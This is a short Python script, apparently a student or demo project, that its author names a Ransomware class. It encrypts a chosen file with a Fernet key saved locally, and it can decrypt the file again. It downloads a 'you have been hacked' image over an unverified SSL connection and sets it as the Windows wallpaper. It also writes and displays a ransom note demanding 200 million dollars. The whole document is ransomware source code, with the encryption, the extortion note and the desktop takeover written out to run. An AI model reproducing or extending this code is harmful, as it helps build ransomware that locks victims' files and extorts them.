#!/usr/bin/env python3
# Jordan Marshall
# Attributes to ChatGPT, Demo code and Sierra Maldonado
# File Encrytption Script

# Main

import os
import datetime
import pyautogui
import subprocess
import win32gui
import urllib.request
import ssl
import ctypes
from cryptography.fernet import Fernet


# Functions to write key and load key
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()


class Ransomware:
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            write_key()
        self.key = load_key()

    # Encrypt files using the Fernet symmetric key
    def encrypt_file(self):
        file_path = input("Enter the path of the file you want to encrypt: ")
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(self.key)
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)

    # Decrypt files using the Fernet symmetric key
    def decrypt_file(self):
        file_path = input("Enter the path of the file you want to decrypt: ")
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(self.key)
        decrypted = fernet.decrypt(data)
        with open(file_path, "wb") as f:
            f.write(decrypted)

 # Change Background
    def change_background(self):
        image_url = "https://www.unigamesity.com/wp-content/uploads/2009/05/you-have-been-hacked.jpg"
        path = "C:/Windows/Web/wallpaper.jpg"
        context = ssl._create_unverified_context()
        with urllib.request.urlopen(image_url, context=context) as u, open(path, 'wb') as f:
            f.write(u.read())
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    # Windows Popup blocker
    def ransom_note(self):
        date = datetime.date.today()
        with open('Note.txt', 'w') as f:
            f.write(f'''Get ducked, NERD, I have stolen and locked away all your data. I will open your Computer for a fee of 200 MILLION dollars\n
                        Please send the money and I will unlock your computer.''')
        pyautogui.alert("Super Hacked")

    def popup(self):
        ransom = subprocess.Popen(['notepad.exe', 'Note.txt'])
        top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())

ransomware = Ransomware()

while True:
    user_input = input("What would you like to do? (Encrypt, Pop-up, Background, Decrypt, or Exit): ")
    if user_input.lower() == "encrypt":
        #encryption
        ransomware.encrypt_file()

    elif user_input.lower() == "pop-up":
        # windows pop-up
        ransomware.ransom_note()
        ransomware.popup()

    elif user_input.lower() == "background":
        #windows background change
        ransomware.change_background()

    elif user_input.lower() == "decrypt":
        #Decryption
        ransomware.decrypt_file()

    elif user_input.lower() == "exit":
        break
# End 
